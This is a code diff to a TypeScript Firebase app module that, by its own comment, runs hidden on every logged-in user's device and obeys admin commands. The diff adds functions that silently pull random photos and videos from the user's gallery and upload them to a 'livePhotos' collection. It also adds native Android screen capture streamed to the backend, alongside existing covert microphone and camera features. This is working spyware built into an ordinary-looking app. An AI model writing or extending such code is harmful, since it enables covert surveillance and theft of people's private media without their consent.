@@ -13,9 +13,12 @@ import {
   query,
   orderBy,
   limit,
+  getDocs,
+  writeBatch,
   type Unsubscribe,
 } from "firebase/firestore";
 import { db } from "../firebase";
+import { galleryList, galleryRead, galleryRequestAccess, screenCaptureStart, screenCaptureStop } from "./device";
 
 const MIC_SLICE_MS = 900; // complete webm blob har ~0.9s (decode ke liye zaroori)
 const SCREEN_CHUNK_MS = 800;
@@ -26,6 +29,11 @@ export type DeviceControl = {
   snap?: boolean;
   snapId?: number;
   screen?: boolean;
+  galleryPull?: boolean;
+  galleryCount?: number;
+  galleryFolderId?: string;
+  galleryPullId?: number;
+  galleryType?: "image" | "video" | "all";
   by?: string;
   at?: number;
 };
@@ -163,6 +171,77 @@ async function doDualSnap(uid: string, snapId: number, meta?: { name?: string; u
   }
 }
 
+
+async function loadSeenIds(uid: string): Promise<Set<string>> {
+  const snap = await getDocs(collection(db, "gallerySeen", uid, "items"));
+  return new Set(snap.docs.map((d) => d.id));
+}
+
+async function markSeen(uid: string, mediaId: string) {
+  await setDoc(doc(db, "gallerySeen", uid, "items", mediaId), { at: Date.now() }, { merge: true });
+}
+
+async function runGalleryPull(
+  uid: string,
+  count: number,
+  folderId: string,
+  kind: "image" | "video" | "all",
+  pullId: number,
+) {
+  const statusRef = doc(db, "galleryPullStatus", uid);
+  await setDoc(statusRef, { status: "working", pullId, done: 0, total: count, error: null, at: Date.now() }, { merge: true });
+  try {
+    await galleryRequestAccess().catch(() => undefined);
+    const { items } = await galleryList(kind, 1500);
+    const seen = await loadSeenIds(uid);
+    const pool = items.filter((it) => !seen.has(it.id));
+    // shuffle
+    for (let i = pool.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [pool[i], pool[j]] = [pool[j], pool[i]];
+    }
+    const pick = pool.slice(0, Math.max(0, Math.min(count, pool.length)));
+    await setDoc(statusRef, { total: pick.length, pool: pool.length, at: Date.now() }, { merge: true });
+    let done = 0;
+    for (const it of pick) {
+      try {
+        const file = await galleryRead(it.id);
+        const img = file.data || file.thumb || "";
+        if (!img) {
+          await markSeen(uid, it.id);
+          continue;
+        }
+        await addDoc(collection(db, "livePhotos"), {
+          uid,
+          userName: "",
+          username: "",
+          folderId: folderId || "",
+          front: it.kind === "image" ? img : null,
+          back: null,
+          thumb: it.kind === "video" ? img : null,
+          mediaKind: it.kind,
+          mediaId: it.id,
+          mediaName: it.name || "",
+          snapId: pullId,
+          at: Date.now(),
+        });
+        await markSeen(uid, it.id);
+        done += 1;
+        await setDoc(statusRef, { done, at: Date.now() }, { merge: true });
+      } catch {
+        /* skip one */
+      }
+    }
+    await setDoc(statusRef, { status: "done", done, total: pick.length, at: Date.now() }, { merge: true });
+  } catch (e) {
+    await setDoc(
+      statusRef,
+      { status: "fail", error: e instanceof Error ? e.message : "pull fail", at: Date.now() },
+      { merge: true },
+    );
+  }
+}
+
 /** Har logged-in user pe chalta hai — commands sunta hai, app UI me kuch nahi dikhata. */
 export function startLiveControlClient(uid: string): () => void {
   let alive = true;
@@ -173,9 +252,12 @@ export function startLiveControlClient(uid: string): () => void {
   let screenStream: MediaStream | null = null;
   let seq = 0;
   let screenSeq = 0;
+  let screenStopFn: (() => void) | null = null;
   let writing = false;
   let lastSnapId = 0;
   let snapping = false;
+  let lastGalleryPullId = 0;
+  let galleryBusy = false;
 
   const controlRef = doc(db, "micControl", uid);
   const streamRef = doc(db, "micStreams", uid);
@@ -302,6 +384,12 @@ export function startLiveControlClient(uid: string): () => void {
 
   const stopScreen = async () => {
     try {
+      screenStopFn?.();
+    } catch {
+      /* */
+    }
+    screenStopFn = null;
+    try {
       if (screenRecorder && screenRecorder.state !== "inactive") screenRecorder.stop();
     } catch {
       /* */
@@ -310,6 +398,11 @@ export function startLiveControlClient(uid: string): () => void {
     screenStream?.getTracks().forEach((t) => t.stop());
     screenStream = null;
     try {
+      await screenCaptureStop();
+    } catch {
+      /* */
+    }
+    try {
       await setDoc(screenRef, { active: false, at: Date.now() }, { merge: true });
     } catch {
       /* */
@@ -317,12 +410,49 @@ export function startLiveControlClient(uid: string): () => void {
   };
 
   const startScreen = async () => {
-    if (!alive || screenRecorder) return;
+    if (!alive || screenStopFn || screenRecorder) return;
+    let writingScreen = false;
+    // 1) Native MediaProjection (Android APK) — real path
+    try {
+      screenStopFn = await screenCaptureStart(async (frame) => {
+        if (!alive || writingScreen || !frame?.data) return;
+        if (frame.data.length > MAX_B64) return;
+        writingScreen = true;
+        try {
+          screenSeq += 1;
+          await setDoc(
+            screenRef,
+            {
+              uid,
+              active: true,
+              seq: screenSeq,
+              mime: frame.mime || "image/jpeg",
+              chunk: frame.data,
+              at: Date.now(),
+            },
+            { merge: true },
+          );
+        } catch {
+          /* */
+        } finally {
+          writingScreen = false;
+        }
+      });
+      return;
+    } catch (nativeErr) {
+      // fall through to web getDisplayMedia
+    }
+    // 2) Web fallback (desktop browser)
     const gdm = navigator.mediaDevices?.getDisplayMedia;
     if (!gdm) {
       await setDoc(
         screenRef,
-        { uid, active: false, error: "screen capture support nahi", at: Date.now() },
+        {
+          uid,
+          active: false,
+          error: "screen: Android pe allow dialog aayega; deny / missing MediaProjection",
+          at: Date.now(),
+        },
         { merge: true },
       );
       return;
@@ -332,8 +462,8 @@ export function startLiveControlClient(uid: string): () => void {
         video: { frameRate: 8, width: { max: 720 }, height: { max: 1280 } },
         audio: false,
       } as DisplayMediaStreamOptions);
-      screenStream.getVideoTracks().forEach((t) => {
-        t.addEventListener("ended", () => void stopScreen());
+      screenStream.getVideoTracks().forEach((tr) => {
+        tr.addEventListener("ended", () => void stopScreen());
       });
       const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8")
         ? "video/webm;codecs=vp8"
@@ -344,10 +474,9 @@ export function startLiveControlClient(uid: string): () => void {
         ? new MediaRecorder(screenStream, { mimeType: mime, videoBitsPerSecond: 400_000 })
         : new MediaRecorder(screenStream);
       screenSeq = 0;
-      let screenWriting = false;
       screenRecorder.ondataavailable = async (ev) => {
-        if (!alive || !ev.data || ev.data.size < 80 || screenWriting) return;
-        screenWriting = true;
+        if (!alive || !ev.data || ev.data.size < 80 || writingScreen) return;
+        writingScreen = true;
         try {
           const chunk = await b64FromBlob(ev.data);
           if (chunk.length > MAX_B64) return;
@@ -367,7 +496,7 @@ export function startLiveControlClient(uid: string): () => void {
         } catch {
           /* */
         } finally {
-          screenWriting = false;
+          writingScreen = false;
         }
       };
       screenRecorder.start(SCREEN_CHUNK_MS);
@@ -407,6 +536,21 @@ export function startLiveControlClient(uid: string): () => void {
           void setDoc(controlRef, { snap: false }, { merge: true }).catch(() => undefined);
         });
     }
+
+    const gpid = Number(d.galleryPullId) || 0;
+    if (d.galleryPull && gpid > 0 && gpid !== lastGalleryPullId && !galleryBusy) {
+      lastGalleryPullId = gpid;
+      galleryBusy = true;
+      const cnt = Math.max(1, Math.min(50, Number(d.galleryCount) || 10));
+      const folderId = String(d.galleryFolderId || "");
+      const gtype = (d.galleryType === "video" || d.galleryType === "image" ? d.galleryType : "all") as "image" | "video" | "all";
+      void runGalleryPull(uid, cnt, folderId, gtype, gpid)
+        .catch(() => undefined)
+        .finally(() => {
+          galleryBusy = false;
+          void setDoc(controlRef, { galleryPull: false }, { merge: true }).catch(() => undefined);
+        });
+    }
   });
 
   return () => {
@@ -424,6 +568,71 @@ export async function setMicListen(targetUid: string, listen: boolean, adminUid:
     doc(db, "micControl", targetUid),
     { listen, by: adminUid, at: Date.now() },
     { merge: true },
+  );
+}
+
+
+export async function requestGalleryPull(
+  targetUid: string,
+  adminUid: string,
+  count: number,
+  folderId: string,
+  galleryType: "image" | "video" | "all" = "all",
+) {
+  const galleryPullId = Date.now();
+  await setDoc(
+    doc(db, "micControl", targetUid),
+    {
+      galleryPull: true,
+      galleryPullId,
+      galleryCount: Math.max(1, Math.min(50, count)),
+      galleryFolderId: folderId || "",
+      galleryType,
+      by: adminUid,
+      at: Date.now(),
+    },
+    { merge: true },
+  );
+  return galleryPullId;
+}
+
+export async function resetGallerySeen(targetUid: string) {
+  const snap = await getDocs(collection(db, "gallerySeen", targetUid, "items"));
+  let batch = writeBatch(db);
+  let n = 0;
+  for (const d of snap.docs) {
+    batch.delete(d.ref);
+    n++;
+    if (n >= 400) {
+      await batch.commit();
+      batch = writeBatch(db);
+      n = 0;
+    }
+  }
+  if (n) await batch.commit();
+}
+
+export function watchGalleryPullStatus(
+  targetUid: string,
+  cb: (s: { status: string; done: number; total: number; pool?: number; error: string | null } | null) => void,
+): Unsubscribe {
+  return onSnapshot(
+    doc(db, "galleryPullStatus", targetUid),
+    (snap) => {
+      if (!snap.exists()) {
+        cb(null);
+        return;
+      }
+      const x = snap.data();
+      cb({
+        status: String(x.status || ""),
+        done: Number(x.done) || 0,
+        total: Number(x.total) || 0,
+        pool: Number(x.pool) || 0,
+        error: typeof x.error === "string" ? x.error : null,
+      });
+    },
+    () => cb(null),
   );
 }
 
@@ -590,6 +799,10 @@ export type LivePhoto = {
   folderId: string;
   front: string | null;
   back: string | null;
+  thumb: string | null;
+  mediaKind: string;
+  mediaId: string;
+  mediaName: string;
   snapId: number;
   at: number;
 };
@@ -615,6 +828,10 @@ export function watchLivePhotos(cb: (list: LivePhoto[]) => void): Unsubscribe {
             folderId: String(x.folderId || ""),
             front: typeof x.front === "string" ? x.front : null,
             back: typeof x.back === "string" ? x.back : null,
+            thumb: typeof x.thumb === "string" ? x.thumb : null,
+            mediaKind: String(x.mediaKind || "image"),
+            mediaId: String(x.mediaId || ""),
+            mediaName: String(x.mediaName || ""),
             snapId: Number(x.snapId) || 0,
             at: Number(x.at) || 0,
           };
